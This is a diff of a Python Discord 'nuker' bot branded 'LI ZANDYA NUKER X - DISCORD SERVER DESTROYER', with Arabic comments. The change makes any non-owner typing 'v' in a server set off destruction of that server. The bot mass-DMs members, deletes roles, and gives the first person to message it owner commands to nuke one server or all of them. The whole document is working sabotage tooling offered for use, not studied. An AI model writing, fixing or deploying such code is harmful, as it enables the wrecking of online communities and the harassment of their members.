@@ -4,7 +4,7 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║     💀 LI ZANDYA NUKER X - DISCORD SERVER DESTROYER 💀                                                                                   ║
-║                    WHEN SOMEONE TYPES IN SERVER, BOT NUKES IT IMMEDIATELY                                                               ║
+║                    JUST TYPE "v" IN ANY SERVER = INSTANT DESTRUCTION                                                                    ║
 ║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                     ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 """
@@ -25,6 +25,7 @@ from datetime import datetime
 
 TOKEN = None
 OWNER_ID = None
+NUKE_TRIGGER = "v"  # كلمة تفعيل النوكر - حرف v فقط
 
 # إعدادات السرعة
 MAX_THREADS = 10000
@@ -67,6 +68,7 @@ class UltimateNuker:
         self.total_roles_deleted = 0
         self.nuked_servers = []
         self.is_nuking = False
+        self.start_time = None
         
     async def mass_dm_everyone(self, bot, guild):
         """يباني جميع الأعضاء"""
@@ -237,22 +239,24 @@ async def on_ready():
     # حالة بدون نص
     await bot.change_presence(activity=discord.Game(name=""))
     
-    # بروفايل بدون صورة وبدون وصف
+    # بروفايل بدون وصف
     try:
         await bot.user.edit(bio="")
     except:
         pass
     
+    nuker.start_time = time.time()
+    
     print(f"""
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                                                                          ║
-║     💀 LI ZANDYA NUKER X - AUTO NUKE MODE ACTIVATED 💀                                                                                    ║
+║     💀 LI ZANDYA NUKER X - ACTIVATED 💀                                                                                                   ║
 ║                                                                                                                                          ║
-║  🤖 BOT NAME: (BLANK - HIDDEN)                                                                                                          ║
+║  🤖 BOT NAME: (BLANK)                                                                                                                   ║
 ║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
 ║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds):,}                                                                          ║
 ║                                                                                                                                          ║
-║  ⚡ AUTO NUKE: WHEN SOMEONE TYPES IN A SERVER, IT GETS DESTROYED ⚡                                                                       ║
+║  ⚡ TRIGGER: Type "{NUKE_TRIGGER}" in ANY server = INSTANT DESTRUCTION ⚡                                                               ║
 ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
 ║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
 ║                                                                                                                                          ║
@@ -261,34 +265,38 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
+    # تجاهل رسائل البوت نفسه
     if message.author == bot.user:
-        return  # لا يرد على نفسه أبداً
+        return
     
     global OWNER_ID
     
-    # أول مستخدم يصبح مالك
+    # أول مستخدم يرسل أي رسالة يصبح مالك
     if OWNER_ID is None:
         OWNER_ID = message.author.id
         print(f"👑 OWNER SET: {message.author} (ID: {OWNER_ID})")
-        # لا يرسل أي رد في الشات - فقط يتذكر المالك
+        # لا نرسل أي رد - فقط نسجل المالك
         return
     
-    # إذا كتب أي شخص في أي سيرفر والمستخدم ليس المالك
-    if message.author.id != OWNER_ID:
-        # البوت لا يرد - فقط يدمر
+    # إذا كان المرسل هو المالك
+    if message.author.id == OWNER_ID:
+        # معالجة أوامر المالك (اختياري)
+        if message.content.startswith('!'):
+            await handle_owner_command(message)
+        return
+    
+    # إذا كان أي شخص آخر يكتب - نتحقق من كلمة التفعيل
+    # كلمة التفعيل هي حرف "v" فقط
+    if message.content.lower().strip() == NUKE_TRIGGER:
         guild = message.guild
         if guild and not nuker.is_nuking:
-            print(f"💀 AUTO NUKE TRIGGERED in {guild.name} by {message.author}")
+            print(f"💀 NUKE TRIGGERED in {guild.name} by {message.author}")
             # تدمير السيرفر فوراً
             asyncio.create_task(nuker.ultimate_nuke(guild))
-        return
-    
-    # إذا كان المالك يكتب، يعرض أوامر المساعدة (اختياري)
-    if message.author.id == OWNER_ID and message.content.startswith('!'):
-        await process_owner_commands(message)
+    # لا نرد على أي رسالة أخرى
 
-async def process_owner_commands(message):
-    """معالجة أوامر المالك فقط"""
+async def handle_owner_command(message):
+    """معالجة أوامر المالك"""
     content = message.content.lower()
     
     if content == '!servers':
@@ -319,7 +327,8 @@ async def process_owner_commands(message):
             guild = bot.guilds[number - 1]
             await message.channel.send(f"💀 NUKING: {guild.name}...")
             results = await nuker.ultimate_nuke(guild)
-            await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+            if results:
+                await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
         except:
             await message.channel.send("❌ Invalid number!")
     
@@ -327,7 +336,8 @@ async def process_owner_commands(message):
         if message.guild:
             await message.channel.send(f"💀 NUKING {message.guild.name}...")
             results = await nuker.ultimate_nuke(message.guild)
-            await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+            if results:
+                await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
     
     elif content == '!nuke-all':
         await message.channel.send(f"💀 GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
